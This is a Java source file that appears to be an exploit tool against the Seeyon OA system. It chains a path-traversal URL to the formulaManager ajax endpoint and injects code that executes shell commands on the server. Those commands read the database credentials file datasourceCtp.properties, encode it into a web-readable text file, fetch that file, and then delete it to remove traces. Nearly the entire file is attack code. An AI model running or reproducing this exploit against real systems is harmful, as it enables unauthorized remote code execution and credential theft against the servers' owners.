import java.util.UUID;

public class DataConf {
    public void DataConf(String oaUrl) throws Exception {
        HTTPClient httpClient = new HTTPClient();
        String realUrl = oaUrl + "/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip";
        UUID uuid = UUID.randomUUID();
        String uuidStr = uuid.toString();
        uuidStr = uuidStr.replace("-", "");
        String getUrl = oaUrl + "/" + uuidStr + ".txt";
        String uuidTxt = "../webapps/seeyon/" + uuidStr + ".txt";
        String winDel = "cd ../webapps/seeyon&del "+uuidStr+".txt";
        String linuxDel = "cd ../webapps/seeyon;rm -f " +uuidStr+".txt";
        String winReadDadaConf = "cd ../../base/conf & type datasourceCtp.properties";
        String linReadDadaConf = "cat ../../base/conf/datasourceCtp.properties";
        String execString = "[{'formulaType':1,'formulaName':'test','formulaExpression':'Properties prop = System.getProperties(); String os = prop.getProperty(\"os.name\");Process pc = null;if (os.startsWith(\"win\") || os.startsWith(\"Win\")){ProcessBuilder pb=new ProcessBuilder(\"cmd\",\"/c\",\"" + winReadDadaConf + "\");pc =pb.start();}else{ProcessBuilder pb=new ProcessBuilder(\"/bin/sh\",\"-c\",\"" + linReadDadaConf + "\");pc = pb.start();};java.io.BufferedReader br = new java.io.BufferedReader(new InputStreamReader(pc.getInputStream(),\"GBK\"));String line = \"\";StringBuilder sb = new StringBuilder();while((line = br.readLine())!=null){sb.append(line+\"\\\\n\");};br.close();String sbStr = sb.toString();System.out.println(sbStr);sun.misc.BASE64Encoder encoder=new sun.misc.BASE64Encoder();byte[] enByte = sbStr.getBytes(\"UTF-8\");String enStr = encoder.encode(enByte);char[] enChar = enStr.toCharArray();String Base65 = \"\";for (int i=0;i<enChar.length;i++){ int intCh = (int)enChar[i]+1;Base65 = Base65 + Integer.toHexString(intCh); };java.io.FileWriter writer = new java.io.FileWriter(\""+uuidTxt+"\");writer.write(Base65);writer.flush();writer.close();};test();def static xxx(){'},'',{},'true']";
        String execUrl = new Encoder().Encoder(execString);
        String execExp = "managerMethod=validate&arguments=" + execUrl;
        //删除回显文件payload
        //java文件删除无法删除文件，应该是权限不够
        //String delString = "[{'formulaType':1,'formulaName':'test','formulaExpression':'java.io.File file=new java.io.File(\""+uuidTxt+"\");file.delete();};test();def static xxx(){'},'',{},'true']";
        String delString = "[{'formulaType':1,'formulaName':'test','formulaExpression':'Properties prop = System.getProperties(); String os = prop.getProperty(\"os.name\");if (os.startsWith(\"win\") || os.startsWith(\"Win\")){ProcessBuilder pb=new ProcessBuilder(\"cmd\",\"/c\",\""+winDel+"\");Process process = pb.start();}else{ProcessBuilder pb=new ProcessBuilder(\"/bin/sh\",\"-c\",\""+linuxDel+"\");Process process = pb.start();}};test();def static xxx(){'},'',{},'true']";
        String expDelUrl = new Encoder().Encoder(delString);
        String expDel = "managerMethod=validate&arguments=" + expDelUrl;
        System.out.println(execExp);
        //执行的顺序为，写入回显文件，得到回显文件内容，删除回显文件
        httpClient.sendPost(realUrl,execExp);
        Thread.sleep(2 * 1000);
        httpClient.getRes(getUrl);
        Thread.sleep(2 * 1000);
        httpClient.doDel(getUrl,expDel);
    }
}
